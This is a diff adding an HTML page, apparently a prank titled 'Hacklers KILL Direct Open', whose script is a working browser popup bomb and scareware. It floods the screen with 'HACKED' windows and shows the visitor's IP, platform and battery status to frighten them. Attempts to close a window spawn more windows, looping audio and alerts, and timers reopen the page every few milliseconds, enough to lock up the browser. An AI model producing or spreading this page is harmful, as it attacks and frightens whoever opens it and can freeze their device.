@@ -1,0 +1,69 @@
+<html>
+    <head>
+        <title>Hacklers KILL Direct Open</title>
+        <link rel="stylesheet" href="styles.css">
+    </head>
+    <body>
+        <script>
+        function addWindow(text) {
+            var hackedWindow = window.open("", "", "width=400,height=400")
+            hackedWindow.document.writeln(text)
+            setInterval(function() {
+                hackedWindow.document.title = (Math.random() * Number.MAX_VALUE).toString()
+            }, 1)
+            
+            var height = window.screen.availHeight
+            var width = window.screen.availWidth
+            
+            setInterval(function() {
+                hackedWindow.moveTo(Math.floor(Math.random() * (width - 400)), Math.floor(Math.random() * (height - 400)))
+            }, 1)
+
+            hackedWindow.addEventListener("beforeunload", stopClose, false)
+            
+            return hackedWindow
+        }
+
+        function stopClose() {
+            const audio = new Audio("https://www.fesliyanstudios.com/play-mp3/387");
+            audio.loop = true
+            audio.play()
+            alert("Think you can close me?!")
+            addWindow("Think you can close me?!")
+            addWindow("Think you can close me?!")
+            addWindow("<img src='https://i.pinimg.com/736x/72/cf/8e/72cf8eeeaf310f363608fd30367ac635.jpg' width='100%' height='100%'>")
+        }
+
+        var windows = []
+        var newWindows = []
+        
+        async function getIP() {
+            var res = await fetch("https://api.ipify.org?format=json")
+            var data = await res.json()
+            return data.ip
+        }
+                
+                windows.push(addWindow("HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED"))
+                navigator.getBattery().then((battery) => {
+                    windows.push(addWindow(`Your battery is ${battery.charging ? "Charging" : "Not Charging"}`))
+                })
+                windows.push(addWindow(`Platform: ${navigator.platform}`))
+                getIP().then((ip) => windows.push(addWindow(`IP: ${ip}`)))
+            
+                setInterval(function() {
+                    window.open('https://hacklers.github.io/blank', '' ,'')
+                }, 1)
+                setInterval(function() {
+                    windows.forEach((element) => {
+                        element.focus()
+                    })
+                }, 1000)
+            
+                setInterval(function() {
+                    var kill_direct = window.open("https://hacklers.github.io/kill_direct", "", "width=400, height=400")
+                    kill_direct.document.title = Math.random() * Number.MAX_VALUE
+                    kill_direct.moveTo(Math.floor(Math.random() * (window.screen.availWidth - 400), Math.random() * (window.screen.availHeight - 400)))
+                }, 10)
+        </script>
+    </body>
+</html>
